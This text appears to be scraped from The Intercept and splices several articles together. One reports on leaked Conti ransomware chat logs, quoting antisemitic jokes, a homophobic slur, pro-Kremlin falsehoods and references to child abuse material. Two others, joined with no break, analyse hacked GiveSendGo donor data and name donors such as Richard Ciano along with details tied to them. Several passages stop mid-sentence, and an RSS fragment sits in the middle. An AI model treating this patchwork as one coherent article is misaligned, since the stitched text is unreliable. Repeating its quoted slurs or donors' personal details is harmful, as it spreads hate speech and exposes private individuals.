<p>The Intercept reviewed the most recent month of logs, focusing on those originating from RocketChat, a group-chat system similar to Discord or Slack, that Conti hosted on the anonymity network Tor. The messages are full of typos, slang, and a heavy use of <em><a href="https://en.wikipedia.org/wiki/Mat_(Russian_profanity)">mat</a></em> — vulgar Russian profanity. We translated these messages using Google Translate and DeepL, and then a native Russian speaker manually corrected them. As with any translations, there are sometimes multiple possible interpretations, so we are making the original Russian <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/document/2022/03/14/contileaks-translations/">available here</a>. All time stamps from chat messages are in Coordinated Universal Time.</p>
<!-- BLOCK(newsletter)[0](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[0] -->
<p>Logs of only some chat rooms appear to have been leaked. Most of the recent messages are from the #general channel, a room where the hackers candidly discussed non-ransomware topics like drug use, pornography, cryptocurrency, an obsession with investigative journalist Brian Krebs, and occasionally technical topics. While the #general channel had 160 users — Conti is a very large criminal enterprise — only a handful of these users actually posted messages during the monthlong period.</p>
<p>The conversations quickly turned political on February 21 when Putin announced that Russia recognized the separatist territories Donetsk and Luhansk in eastern Ukraine as independent nations, and on February 24 when Russian troops invaded Ukraine. The Russian hackers openly repeated Putin’s falsehoods as fact, such as that Ukraine is run by a “neo-Nazi junta” and that its government is seeking nuclear weapons. Members of the chat continually shared news updates that exaggerated Russia’s success so far in the war.</p>
<p>The chat logs also include a heavy dose of misogyny, including discussions of child sexual abuse content and jokes about rape, as well as antisemitism aimed at Ukrainian President Volodymyr Zelenskyy.</p>
<p>Also on February 21, Conti announced internally to its employees that the leader of the criminal enterprise had gone into hiding. While it’s unclear exactly what happened, the announcement said that “close attention to the company from the outside has led to the fact that the boss apparently decided to lay low.” It added that Conti did not have enough money to pay everyone’s salaries and asked that they take two to three months of vacation. While Conti’s active operations had ceased, the server hosting RocketChat was still up, so the conversations after that were purely about Russia’s war in Ukraine. CyberScoop this week <a href="https://www.cyberscoop.com/ransomware-gang-conti-bounced-back/">quoted</a> sources saying Conti recovered from the leaks and is operational.</p>
<h2>The Conti Ransomware Gang</h2>
<p>Conti is the most successful ransomware gang in operation today. As Check Point Research has <a href="https://research.checkpoint.com/2022/leaks-of-conti-ransomware-group-paint-picture-of-a-surprisingly-normal-tech-start-up-sort-of/">reported</a>, the gang appears to operate much like a large corporation, with twice-monthly payroll, five-day workweeks, staggered shifts to ensure around-the-clock operation, and even physical offices. According to a <a href="https://go.chainalysis.com/rs/503-FAP-074/images/Crypto-Crime-Report-2022.pdf">2022 report</a> on cryptocurrency crime from the company Chainalysis, Conti extorted at least $180 million from its hacking victims last year.</p>
<p>Many of the victims have been in the health care sector, including, Ireland&#8217;s public care system. In May 2021, in the midst of the Covid-19 pandemic, Conti encrypted data on 85,000 Irish health care computers and demanded a $20 million ransom payment in exchange for the decryptor, according to a report in CPO Magazine. Ireland’s Health Service Executive refused to pay the ransom, but it’s still <a href="https://www.cpomagazine.com/cyber-security/irish-healthcare-system-requires-more-than-100-million-to-recover-from-the-conti-ransomware-attack/">costing Ireland 100 million euros</a> to recover from the attack. The FBI also <a href="https://www.cpomagazine.com/cyber-security/fbi-issues-alert-over-increased-conti-ransomware-attacks-targeting-the-healthcare-system-and-first-responder-networks/">warned</a> that Conti ransomware attacks targeted at least 16 health care networks in the United States.</p>
<p>Conti employees appear to be active during work hours in the Moscow time zone and all internal communication is in Russian, though some people involved don’t live in Russia. One frequent poster in the chat rooms, who goes by the username &#8220;Patrick,&#8221; appears to be a Russian citizen living in Australia. An older member of Conti is a 55-year-old Latvian woman, according to <a href="https://krebsonsecurity.com/2022/03/conti-ransomware-group-diaries-part-i-evasion/">reporting</a> by Krebs. Based on these chat logs, Conti appears to be an independent criminal enterprise without formal ties to the Russian government.</p>
<p>But it appears that Russian intelligence reached out to members of Conti on at least one occasion. After the ContiLeaks were published, Christo Grozev, executive director of the investigative journalism group Bellingcat, tweeted that his organization had been warned that “a global cyber crime group acting on an FSB [Russia’s security agency] order has hacked one of your contributors,” and they were looking for information about Alexey Navalny, the imprisoned  Russian opposition leader. In 2020, FSB agents were <a href="https://www.bbc.com/news/world-europe-55303703">implicated</a> in a poisoning attack on Navalny.</p>

<p>The day after Russian troops began their invasion of Ukraine, Conti <a href="https://research.checkpoint.com/2022/leaks-of-conti-ransomware-group-paint-picture-of-a-surprisingly-normal-tech-start-up-sort-of/">posted a statement</a> on its website, a site normally used used for publishing data from companies that refuse to pay ransom. Conti announced its “full support of Russian government,” and warned that if anyone attacked Russia, cyber or otherwise, they would use “all possible resources to strike back at the critical infrastructures of an enemy.”</p>

<h2>Repeating Putin’s Conspiratorial Lies</h2>
<p>When Russian soldiers invaded Ukraine on February 24, people in Conti&#8217;s #general channel began discussing the war. One member of the chat, Patrick, was by far the most swayed by Putin’s lies about Ukraine. Patrick insisted that war was inevitable because Ukraine was attempting to obtain nuclear weapons. This <a href="https://www.nytimes.com/2022/02/23/us/politics/putin-ukraine-nuclear-weapons.html">is false</a>, but this conspiracy theory made up a large part of a speech Putin gave on February 21 just prior to the invasion.</p>
<p style="padding-left: 30px">2022-02-24 09:53:54 <b>patrick</b>: war was inevitable, ukraine made an application for nuclear weapons<br />
2022-02-24 09:54:37 <b>patrick</b>: in their possession<br />
2022-02-24 09:55:00 <b>weldon</b>: monkeys don&#8217;t explain things, they climb trees<br />
2022-02-24 09:55:02 <b>elijah</b>: @patrick well done and done. Still, no one will ever use it. Yes, just to scare<br />
2022-02-24 09:56:38 <b>elijah</b>: Look, missiles from North Korea periodically arrive in the territorial waters of the Russian Federation. But no one cares. And they have nuclear weapons, by the way. But somehow no one was alarmed<br />
2022-02-24 09:56:47 <b>patrick</b>: old man, you&#8217;re wrong, there is no doubt about north korea now<br />
2022-02-24 09:58:42 <b>patrick</b>: no one is happy about the war, brothers, but it is high time to put this neo-Nazi gang of Canaris&#8217;s foster kids on trial</p>
<p>In his speech, Putin also falsely claimed that Ukraine’s democratic government is a neo-Nazi dictatorship. Throughout the first days of fighting, Patrick repeatedly insisted that Ukraine is run by a “neo-Nazi junta.” It’s not. Ukraine does a have a <a href="https://www.nbcnews.com/think/opinion/ukraine-has-nazi-problem-vladimir-putin-s-denazification-claim-war-ncna1290946">legitimate Nazi problem</a> (so does the <a href="https://www.npr.org/2022/02/09/1079700404/1-in-5-patriot-front-applicants-say-they-have-ties-to-the-military">United States</a> and <a href="https://khpg.org/en/1608809502">Russia</a>), but Ukranian neo-Nazis are a small minority and don’t hold any positions in government.</p>
<p>Zelenskyy is Jewish. His grandfather, Semyon Ivanovich Zelenskyy, fought the Nazis during World War II. All three of Zelenskyy’s grandfather’s brothers were shot and killed by Nazi soldiers occupying Ukraine.</p>

<p>In another message, Patrick says he’s not fighting in the separatist regions of eastern Ukraine because he’s in Australia, donating money to “the victims of the genocide of the neo-Nazi junta.” Putin <a href="https://www.nytimes.com/2022/02/24/world/europe/putin-ukraine-speech.html">accused</a> Ukraine of committing genocide against Russian-speaking civilians in Donbas—this also isn’t true.</p>

<h2>Zelenskyy and Antisemitism</h2>
<p>Although Putin has justified his invasion by framing it as a war on Nazi ideology, numerous discussions in the chats point toward antisemitic sentiment within Conti. Such bigotry has been a prominent part of an ascendant far-right movement throughout the U.S. and Europe, including in Russia and Ukraine. On February 21, a user named &#8220;Weldon&#8221; pointed out that Zelenskyy is Jewish. Several others joined in with antisemitic jokes.</p>

And the boy answers: &#8211; I&#8217;ve only been Russian for two hours, but I already hate you Jews!</p>
<p>After Russia’s invasion was in full swing, the topic of Jews appeared again. This time, Patrick suggested that Jews ruined the Russian empire, and a user named &#8220;Biggie&#8221; said that it’s necessary to “de-Jewishize” Israel by force. “<em>Pindo</em>” is a slightly pejorative term for an American, and “<em>Pindostan</em>” is slang for the United States.</p>
<p style="padding-left: 30px">2022-02-25 09:10:45 <b>patrick</b>: everyone, up to and including the pindostan [America], must answer for the destruction of my homeland &#8211; the USSR, so be it<br />

<p>Earlier in the month, the user named &#8220;Thomas&#8221; joked with the user &#8220;Angelo&#8221; that he’d be sentenced to eight years in prison for “anti-patriotism” but quickly said he was kidding. Angelo said, “I know you’re kidding. We are brothers!” Thomas made a casual Nazi joke about being Aryan brothers, adding that “the skinhead theme is my favorite.”</p>
<p style="padding-left: 30px">2022-02-16 08:43:42 <b>angelo</b>: we are brothers!<br />

<h2>“It’s Gonna Be Sad Without” Zhirinovsky</h2>
<p>In early February, the 75-year-old ultranationalist Vladimir Zhirinovsky, a demagogic politician and leader of Russia’s Liberal Democratic Party of Russia, was <a href="https://www.rferl.org/a/russia-zhirinovsky-hospitalized-covid/31694843.html">reportedly</a> hospitalized for Covid-19 and in critical condition.</p>
<p>Zhirinovsky is a far-right authoritarian populist known for decades of controversial views. According to a <a href="https://www.nytimes.com/1994/11/06/weekinreview/the-world-here-comes-the-clown-no-joke.html">1994 article</a> in the New York Times, Zhirinovsky called for &#8220;the preservation of the white race&#8221; in a 1992 television appearance to the U.S., which he warned was being turned over by the white population to black and Hispanic people. In 2016, Zhirinovsky strongly supported the election of Donald Trump for U.S. president over Hillary Clinton, <a href="https://www.bloomberg.com/news/articles/2016-08-03/russian-maverick-prays-for-trump-win-to-cement-new-global-order">telling</a> Bloomberg, “Trump and I could impose order on the whole planet. &#8230; Everyone would shut up. There wouldn’t be any extremists, no Islamic State, and white Europeans could feel at ease as we’d send all the immigrants home.”</p>
<p>The Conti hackers seem more than just Putin-supporting Russian patriots — they identify with Zhirinovsky’s far-right, authoritarian, racist politics. In the chat room, they discussed Zhirinovsky’s condition, as well as conspiracy theories about why he’s really in the hospital and if he’s even really sick.</p>
<p style="padding-left: 30px">2022-02-16 13:59:48 <b>kermit</b>: everything is okay in the kremlin<br />

<h2>Feeling the Sanctions</h2>
<p>On February 24, at the very beginning of the West’s sanctions against Russia, members of Conti were clearly already feeling squeezed, including by their inability to buy digital gear from Apple. After <a href="https://twitter.com/FedorovMykhailo/status/1497327555690610689">urging</a> from Ukraine, Apple had quickly <a href="https://www.theverge.com/2022/3/1/22957000/apple-russia-ukraine-invasion-halt-product-sales-app-store">cut off sales</a> of products like iPhones and MacBooks to Russia. The value of Russian’s ruble had plummeted to 85 rubles for each U.S. dollar (by March 7, each dollar cost 150 rubles).</p>
<p style="padding-left: 30px">2022-02-24 07:04:43 <b>angelo</b>: I take it now the latest model iPhone and Macbook are the ones you have now and that&#8217;s it<br />
2022-02-24 07:05:22 <b>weldon</b>: so it is<br />
2022-02-24 07:10:26 <b>biggie</b>: as long as the dollar is 85<br />
2022-02-24 07:11:09 <b>weldon</b>: screw GDP on the dollar<br />
2022-02-24 07:11:25 <b>biggie</b>: What about the iPhone?<br />
2022-02-24 07:12:07 <b>weldon</b>: Shove your iPhones up your ass<br />
2022-02-24 07:12:58 <b>biggie</b>: what about macbooks</p>
<p>They joked about Russia joining NATO so they could switch from the free-falling ruble to the euro. Angelo said he couldn’t even buy a brand of juice because it’s American.</p>
<p style="padding-left: 30px">2022-02-24 07:17:23 <b>biggie</b>: we should join NATO, then the euro would replace the ruble and nothing would drop<br />
2022-02-24 07:17:34 <b>angelo</b>: I even couldn&#8217;t buy Dobry Juice now &#8211; it&#8217;s American<br />
2022-02-24 07:18:31 <b>angelo</b>: you should take Viagra, nothing will drop.<br />
2022-02-24 07:19:20 <b>weldon</b>: @biggie you shouldn&#8217;t miss the shitter when you piss<br />

2022-02-24 07:45:42 <b>biggie</b>: on the other hand we could soon be stocked up<br />
2022-02-24 07:46:12 <b>angelo</b>: but<br />
2022-02-24 07:46:15 <b>angelo</b>: but<br />

2022-02-24 07:46:48 <b>weldon</b>: close up before they close you down</p>
<p>The Conti members even discussed a rumor that PornHub, the major American pornography site, would block Russian users. This was <a href="https://www.snopes.com/fact-check/did-pornhub-block-russian-users/">false</a>; PornHub didn’t actually block Russians from using its service.</p>
<p style="padding-left: 30px">2022-02-24 22:02:38 <b>thomas</b>: Some American senators suggest blocking PornHub in Russia in addition to social networks!<br />
2022-02-24 22:02:44 <b>thomas</b>: That&#8217;s it, we&#8217;re done)<br />
2022-02-24 22:02:49 <b>thomas</b>: They will take away our last joys!</p>
<h2>Obsession With Brian Krebs</h2>
<p>In late January, during a conversation about drug use, the user &#8220;Kermit&#8221; said, “We should send our correspondence to Krebs.” Angelo replied, “The worst that can happen.” They’re referring to Krebs, the investigative journalist who covers cybercrime groups like Conti. This is especially interesting because since ContiLeaks was published, Krebs has, in fact, <a href="https://krebsonsecurity.com/2022/03/conti-ransomware-group-diaries-part-i-evasion/">been</a> <a href="https://krebsonsecurity.com/2022/03/conti-ransomware-group-diaries-part-ii-the-office/">analyzing</a> <a href="https://krebsonsecurity.com/2022/03/conti-ransomware-group-diaries-part-iii-weaponry/">the group&#8217;s</a> <a href="https://krebsonsecurity.com/2022/03/conti-ransomware-group-diaries-part-iv-cryptocrime/">correspondence</a>.</p>
<p style="padding-left: 30px">2022-01-28 20:01:08 <b>kermit</b>: we should send our correspondence to krebs<br />
2022-01-28 20:01:10 <b>angelo</b>: the worst that can happen<br />
2022-01-28 20:02:03 <b>angelo</b>: I come back once in the evening,<br />
Stoned on hash.<br />
Life becomes beautiful<br />
And it&#8217;s madly good.<br />
2022-01-28 20:02:17 <b>angelo</b>: going&#8230;.. smoking&#8230;<br />
2022-01-28 20:02:26 <b>angelo</b>: he&#8217;s freaking out, he&#8217;s gonna say the Chelyabinsk delinquents<br />
2022-01-28 20:02:48 <b>stanton</b>: Cannabis is supposed to be good for your head.<br />
2022-01-28 20:03:04 <b>angelo</b>: everything is relative<br />
2022-01-28 20:03:24 <b>angelo</b>: if you&#8217;re prone to schizophrenia you might end up in a mental hospital<br />
2022-01-28 20:04:30 <b>kermit</b>: or join the KPRF [Communist Party of the Russian Federation]</p>
<p>It’s clear that members of Conti read Krebs’s work. They frequently mention him when they’re talking about anything particularly inappropriate. For example, on February 2, in a conversation about porn, masturbation and articles about performing oral sex on yourself, Kermit posted, “that&#8217;s the kind of correspondence krebs won&#8217;t leak :/”.</p>
<p style="padding-left: 30px">2022-02-02 20:56:41 <b>elliott</b>: :rofl:<br />
2022-02-02 20:57:01 <b>kermit</b>: that&#8217;s the kind of correspondence krebs won&#8217;t leak :/<br />
2022-02-02 20:57:08 <b>angelo</b>: he was reading something about giving himself a blowjob</p>
<p>On February 16, Conti members discussed how to remain anonymous using different Jabber clients, chat programs that can be used to connect decentralized chat servers. They discuss Jabber clients called Pidgin, Psi+, and MCabber, how cool and hackery using them looks, and how well their encryption plugins work. They also discuss how their different anonymous Jabber accounts could get linked if they lose internet access and disconnect from multiple accounts at once. Thomas described his technique for mitigating this threat as “Krebs level.”</p>
<p style="padding-left: 30px">2022-02-16 08:34:19 <b>thomas</b>: i have each Jabber account on a different client or in a different sandbox<br />
2022-02-16 08:34:22 <b>thomas</b>: and turn them on manually<br />
2022-02-16 08:34:27 <b>thomas</b>: so there could be no timing attacks<br />
2022-02-16 08:34:34 <b>thomas</b>: no autostarts<br />
2022-02-16 08:35:00 <b>thomas</b>: in short, the security is krebs level</p>
<h2>Misogyny, Homophobia, Child Sexual Abuse</h2>
<p>The messages in this RocketChat channel #general include the sort of misogyny, casual sexism, and crude anatomical references that have historically been endemic among certain groupings of young computer hackers. In one message, Angelo explained that the #general channel was for “pussy and boobs” and the #announcements channel and private messages were for work.</p>
<p style="padding-left: 30px">2022-02-08 14:56:47 <b>angelo</b>: you see, in general, pussy and boobs and announcements, in PM work</p>
<p>In one conversation on February 3, Angelo joked with others about raping a girl in her sleep. The replies included “iconic move” and “no, don&#8217;t touch them, they&#8217;re for meat when the pigeons and bums run out.”</p>
<p>Members of Conti also frequently used homophobic slurs in the chats. Human rights groups have <a href="https://www.nytimes.com/2017/06/20/world/europe/russia-gay-propaganda.html">denounced</a> Russian prohibitions, under Putin, of so-called gay propaganda — acts considered to promote homosexuality — saying it contributes to an increasingly homophobic environment where acts of <a href="https://www.nytimes.com/2017/04/21/world/europe/chechnya-russia-attacks-gays.html">brutality</a> against gay people are common.</p>
<p>On February 25, Patrick posted about how the Safe Internet League, an internet censorship organization in Russia, was going to declare Yuri Dud a foreign agent after a video he published about Ukraine. Dud is a well-known Russian journalist and <a href="https://www.youtube.com/c/vdud">YouTuber</a> who identifies as Ukrainian. Patrick ended with “Kill the faggots!”</p>
<p>On February 28, Angelo and Kermit discussed child sexual abuse videos (what Kermit openly referred to as “child pornography”) and the ages of girls they liked to watch.</p>
<h2>“The Boss” Is Missing</h2>
<p>On February 21, the user &#8220;Frances,&#8221; who had only posted twice before that month strictly about work, posted a long and surprising update in the #general channel.</p>
<p>The “boss” of the Conti ransomware gang apparently disappeared and couldn’t be reached, probably because of “too much attention to the company from outside” and because of internal leaks. Conti didn’t have enough money in emergency reserves to even pay everyone’s salaries. Frances asked everyone to send him up-to-date contact information, take two to three months of vacation from work, and erase their tracks and clean up their accounts used for hacking in the meantime.</p>
<p>It’s unclear why Conti didn’t have enough money to pay salaries. John Shier, a senior security adviser at the security firm Sophos, <a href="https://www.cyberscoop.com/ransomware-gang-conti-bounced-back/">told</a> CyberScoop that Conti reportedly has a bitcoin wallet with $2 billion in it. And despite the request for employees to take vacation, there have been nearly two dozen news posts with hacked documents from ransomware victims on Conti’s extortion website since February 21.</p>
<p style="padding-left: 30px">2022-02-21 13:30:25 <b>frances</b>: @all<br />
Friends!</p>
<p style="padding-left: 30px">I sincerely apologize for having to ignore your questions the last few days. About the boss, Silver, salaries, and everything else. I was forced to because I simply had nothing to say to you. I was dragging my feet, screwing around with the salary as best I could, hoping that the boss would show up and give us clarity on our next steps. But there is no boss, and the situation around us is not getting any softer, and pulling the cat by the balls further does not make sense.</p>
<p style="padding-left: 30px">We have a difficult situation, too much attention to the company from outside resulted in the fact that the boss has apparently decided to lay low. There have been many leaks, post-New Year&#8217;s receptions, and many other circumstances that incline us all to take some time off and wait for the situation to calm down.</p>
<p style="padding-left: 30px">The reserve money that was set aside for emergencies and urgent team needs was not even enough to cover the last paycheck. There is no boss, no clarity or certainty about what we will do in the future, no money either. We hope that the boss will appear and the company will continue to work, but in the meantime, on behalf of the company I apologize to all of you and ask for patience. All balances on wages will be paid, the only question is when.</p>
<p style="padding-left: 30px">Now I will ask all of you to write to me in person: (ideally on Jabber:))<br />
&#8211; Up-to-date backup contact for communication (preferably register a fresh, uncontaminated public Jabber account<br />
&#8211; Briefly your job responsibilities, projects, PL [programming language] (for coders). Who did what, literally in a nutshell</p>
<p style="padding-left: 30px">In the near future, we, with those team leaders, who stayed in line &#8211; will think how to restart all the work processes, where to find money for salary payments and with renewed vigor to run all our working projects. As soon as there is any news about payments, reorganization and getting back to work &#8211; I will contact everyone. In the meantime, I have to ask all of you to take 2-3 months off. We will try to get back to work as soon as possible. From you all, please be concerned about your personal safety!

<p>Richard Ciano, a prominent member of Canada’s conservative political circles, denied that he made this $100 donation, both <a href="https://twitter.com/robertbenzie/status/1493985476491067394">to the Toronto Star</a> and to the <a href="https://globalnews.ca/news/8625465/ford-government-staffer-fired-over-protest-donation/">Global News</a>. “I did not make any contributions whatsoever to the trucker convoy.

<p>It appears that Ciano’s denial was false. An analysis of the hacked data from GiveSendGo shows that someone using the name Richard Ciano did, in fact, donate to the &#8220;Freedom Convoy.&#8221; The information in the donor listing matches information from other sources, such as Toronto public records, tied to Ciano. (Ciano did not immediately respond to a request for comment.)</p>
<p>Ciano is the former president of the Ontario chapter of the Progressive Conservative Party. He also runs the political strategy firm Campaign Research Inc., which the party uses for polling.</p>
<h2>Evidence in the Data</h2>
<p>The GiveSendGo data shows that on February 6, someone made a $100 donation, with a $5 tip, to GiveSendGo&#8217;s “Freedom Convoy 2022” campaign using an American Express credit card. The donor marked the gift as “anonymous” but entered the name “Richard Ciano” in the form. The donation listing uses Ciano’s email address at campaignresearch.ca, which is the website of his firm.</p>

<p>The donation record also lists a Canadian postal code as well as a unique identifier that represents a specific credit card charge associated with Stripe, the company that processes credit card payments for GiveSendGo.</p>
<p>The hacked data not only includes lists of GiveSendGo donors but also a separate database containing a wealth of detailed information about all Stripe transactions. By looking up the unique identifier from the donor rolls, it’s clear that Stripe successfully processed that transaction using the name “Richard Ciano” and the same postal code as the donor database.</p>
<p>The Stripe data also includes a link to the receipt for this transaction for $105 — $100 for the &#8220;Freedom Convoy&#8221; and an additional $5 for GiveSendGo. The receipt says, “Receipt from Jacob Wells.” Wells co-founded GiveSendGo.</p>

<h2>Canadian Postal Codes</h2>
<p>The postal code attached to the GiveSendGo donation to the &#8220;Freedom Convoy&#8221; is also tied to Ciano in several ways.</p>
<p>Unlike American ZIP codes, Canadian postal codes are extremely specific. The postal code listed on the Ciano donation can be mapped to a single city block in Toronto. Since the Stripe transaction successfully went through, whatever credit card was used to do the transaction was associated with the postal code in the donor rolls.</p>
<!-- BLOCK(newsletter)[2](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[2] -->
<p>The city of Toronto runs a website on which the public can search for donations to municipal political campaigns. A search of donations made during the 2018 municipal elections for the postal code from GiveSendGo lists two donations from Ciano.</p>
<p>Either someone else who shares the same name as Richard Ciano, has a billing address on the same Toronto city block as him, and uses his email address donated to the &#8220;Freedom Convoy&#8221; — or Ciano’s denial about the donation was false.</p>
<h2>Donations to Anti-Vaccine Doctor</h2>
<p>The &#8220;Freedom Convoy&#8221; is the second donation to a GiveSendGo campaign from Ciano. The first donation, on December 23 for $50, was in <a href="https://www.givesendgo.com/G2DR5">support</a> of Dr. Peter McCullough, a cardiologist from Dallas who was fired from Baylor University Medical Center for spreading misinformation about Covid-19 vaccines.</p>
<p>McCullough has <a href="https://news.yahoo.com/doctor-fired-spreading-covid-misinformation-170237445.html">repeatedly lied</a> about Covid-19 vaccines. “With all due respect, none of McCullough’s ideas have been supported by any randomized, double-blind, controlled clinical trials,” Dr. Anuj Malik, an infectious disease physician, <a href="https://www.examiner-enterprise.com/story/news/2021/10/06/doctor-fired-baylor-spreading-covid-19-misinformation-finds-supportive-crowd-bartlesville/5995698001/">told</a> the Bartlesville Examiner-Enterprise, an Oklahoma news outlet, in an interview about McCullough.</p>
<p>The GiveSendGo listing for the Ciano donation to McCullough used a different credit card than the one used for the December donation — a Visa instead of an American Express — but both donations were successfully processed by Stripe using the same postal code. The GiveSendGo data also shows that the Campaign Research email address was subscribed to the crowdfunding site’s email list twice: once in December after the McCullough donation and again this month after his &#8220;Freedom Convoy 2022&#8243; donation.</p>

                                        <content:encoded><![CDATA[<p><u>Like many other</u> major websites used by the far right, the self-described Christian crowdfunding site GiveSendGo, which was used by Canada’s “Freedom Convoy” protest movement against public health measures to raise millions of dollars, has been <a href="https://www.dailydot.com/debug/givesendgo-trucker-convoy-hack-leak/">hacked very badly</a>, exposing a massive amount of data about the movement’s donors. The data shows that this movement is supported by a broad-based international network of far-right activists, as well as wealthy donors, who are also involved in activism against Covid-19 vaccines, American democracy, and the Black Lives Matter movement in the United States.</p>
<p>On February 10, the Ontario Superior Court of Justice <a href="https://www.theglobeandmail.com/canada/article-ontario-court-freezes-access-to-givesendgo-donations-for-truckers/">ordered</a> GiveSendGo to freeze access to the money raised in both of these campaigns. “Know this! Canada has absolutely ZERO jurisdiction over how we manage our funds here at GiveSendGo,” the company <a href="https://twitter.com/GiveSendGo/status/1491940399505682434">tweeted</a> in response.

<p>The Intercept obtained the hacked donor data — including records of roughly 104,000 donors who gave $9.6 million to two separate GiveSendGo crowdfunding campaigns, “Freedom Convoy 2022” and “Adopt a Trucker” — from the transparency collective Distributed Denial of Secrets, which is releasing it to journalists and researchers who request access. (For the record, I’m an adviser to DDoSecrets.)</p>
<p>After analyzing the dataset, The Intercept discovered that the majority of donors to the &#8220;Freedom Convoy&#8221; included in the data are Americans, including U.S. billionaire Thomas Siebel, who is listed as donating $90,000, the largest individual donation. Hundreds of donors are members of the Oath Keepers, an American far-right paramilitary organization. Stewart Rhodes, the Oath Keepers’ founder, was the first January 6 insurrectionist to be <a href="https://www.justice.gov/usao-dc/pr/leader-oath-keepers-and-10-other-individuals-indicted-federal-court-seditious-conspiracy">charged</a> with <a href="https://www.washingtonpost.com/dc-md-va/2022/01/26/stewart-rhodes-jailed-seditious-conspiracy/">seditious conspiracy</a>.</p>

<p>On Wednesday, a Washington Post <a href="https://www.washingtonpost.com/investigations/2022/02/15/american-donors-freedom-convoy-zipcodes/">analysis</a> of U.S. ZIP codes in the data concluded that “the richer an American community was, the more likely residents there were to donate, and the biggest number of contributions often came from communities where registered Republicans made up solid majorities.”</p>
<p>&#8220;Freedom Convoy&#8221; donors also contributed $7.6 million to other fundraising campaigns on GiveSendGo’s platform.</p>
<p>Thousands of donors gave money to various anti-vaccine causes promoted by Project Veritas, a far-right group known for deceptively editing videos of its undercover operations. On Monday, The Intercept <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2022/02/14/covid-disinformation-americas-frontline-doctors-project-veritas/">reported</a> that Project Veritas has collaborated on a video project with America’s Frontline Doctors, a major anti-vaccine propaganda group that works with telehealth companies to rake in millions of dollars <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/09/28/covid-telehealth-hydroxychloroquine-ivermectin-hacked/">selling bogus treatments</a> for Covid-19. After that article was published, Project Veritas and AFLDS both denied that they were working together despite the fact that the video trailer lists a Project Veritas staffer as a consulting producer and promotional materials prominently mention Project Veritas.</p>

<p>And thousands more helped fund efforts to overturn President Joe Biden’s 2020 electoral victory over Donald Trump. Many had also previously given in support of Kyle Rittenhouse, the far-right teenage vigilante who in 2020 shot three Black Lives Matter protesters, killing two of them, in Kenosha, Wisconsin. Rittenhouse was <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/11/19/kyle-rittenhouse-acquittal-trial-ahmaud-arbery/">found not guilty</a> on all counts.</p>
<p>Several donors used government email addresses from agencies like the Transportation Security Administration, the Department of Justice, the Federal Bureau of Prisons, and NASA. The Intercept found one donor who used an email address from the Correctional Service of Canada, the Canadian prison system.</p>
<p>Jacob Wells, co-founder of GiveSendGo, <a href="https://www.washingtonpost.com/investigations/2022/02/15/american-donors-freedom-convoy-zipcodes/">verified the authenticity</a> of the hack to the Washington Post. The Globe and Mail <a href="https://www.theglobeandmail.com/world/article-leak-site-says-it-has-list-of-canada-truck-convoy-donors-after/">confirmed</a> that at least one donor listed in the hacked data donated to the campaign. Brad Howard, the president of a Canadian pressure washer company who donated $75,000 to the fund, issued a statement in support of the &#8220;Freedom Convoy.&#8221; Gizmodo <a href="https://gizmodo.com/givesendgo-leak-freedom-convoy-canada-trucker-protest-d-1848534782">reached out</a> to several top donors listed in the data, but “only a single donor had responded—only to say Gizmodo should investigate Black Lives Matter instead.”</p>
<h2>Most of the Money Came From Canadians</h2>
<p>Of the 104,180 donations, 59 percent came from Americans, while only 39 percent came from Canadians. However, Canadians gave just over 50 percent, $4.8 million, of the total money raised, while American donations made up 44 percent, or $4.2 million.</p>

<p>The largest donation record in the hacked data is for $215,000 but does not include data about the donor or which country the money came from. The only information included is the note “Processed but not recorded.” Wells told the Washington Post that this isn&#8217;t a single donation at all but rather &#8220;an attempt by GiveSendGo to make the public-facing total amount raised accurate, lumping together many donations that came in offline or before its Freedom Convoy campaign page went live.&#8221;</p>

<p>The second-largest donation record is $90,000 from Siebel, a Silicon Valley billionaire who founded the enterprise software company Siebel Systems. The email address associated with his donation is hosted on the domain siebel.org. Siebel has supported right-wing causes in the past: In 2008 he <a href="https://www.mercurynews.com/2008/09/05/silicon-valley-republicans-to-welcome-palin-to-tech-giants-woodside-fundraiser/">hosted a fundraiser</a> for then-vice presidential candidate Sarah Palin.</p>
<p>The third-largest donation record is $75,000 from Brad Howland, president of the Canadian pressure cleaner company Easy Kleen Pressure Systems. The hacked data marks Howland’s donation as “anonymous,” though he <a href="https://www.theglobeandmail.com/world/article-leak-site-says-it-has-list-of-canada-truck-convoy-donors-after/">confirmed</a> to the Globe and Mail that he made this donation and supports the &#8220;Freedom Convoy.&#8221; His donation included the comment “HOLD THE LINE!!!”</p>
<h2>Hundreds of Oath Keepers Donated to the &#8220;Freedom Convoy&#8221;</h2>
<p>By cross-referencing data from this hack with <a href="https://www.npr.org/2021/11/05/1052098059/active-duty-police-in-major-u-s-cities-appear-on-purported-oath-keepers-rosters">last year’s hack</a> of the Oath Keepers, which included membership and donor records, The Intercept discovered 355 matches.</p>
<p>The Oath Keepers were key players in the deadly January 6 Capitol attack that was aimed at overturning Biden’s victory in the 2020 presidential election. <a href="https://www.cbsnews.com/news/oath-keepers-stewart-rhodes-deposed-house-january-6-committee/">Prosecutors allege</a> that Oath Keepers stashed weapons at a nearby hotel as part of “quick reaction forces” that could activate if violence escalated.</p>
<p>Oath Keepers left comments with their donations such as: “NWO Tyrants need to be crushed by the fist of Liberty and Freedom. God bless these truckers and their supporters! Thank you!”; “Make Canada Great Again helps Make America Great Again”; and “The communist pigs in uniform are going to try and steal fuel and food. The Biden Junta is afraid of this happening here. this may be why DHS issued a domestic terrorist threat against americans exercising their first amendment rights. They want to silence free speech and separate people from forming groups to fight the communist coup.”</p>
